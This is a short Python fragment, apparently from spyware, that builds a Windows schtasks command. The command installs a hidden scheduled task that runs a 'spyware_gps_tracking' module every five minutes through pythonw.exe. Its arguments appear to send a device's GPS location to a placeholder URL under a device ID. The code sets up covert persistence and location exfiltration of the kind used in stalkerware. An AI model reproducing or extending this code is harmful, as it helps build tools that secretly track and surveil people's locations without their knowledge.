    if platform.system() == "Windows":
        command = f'schtasks /create /tn "{service_name}" /tr "pythonw.exe -c import spyware_gps_tracking; spyware_gps_tracking.spyware_gps_tracking(5, \'http://example.com/api\', \'device123\')" /sc minute /mo 5'
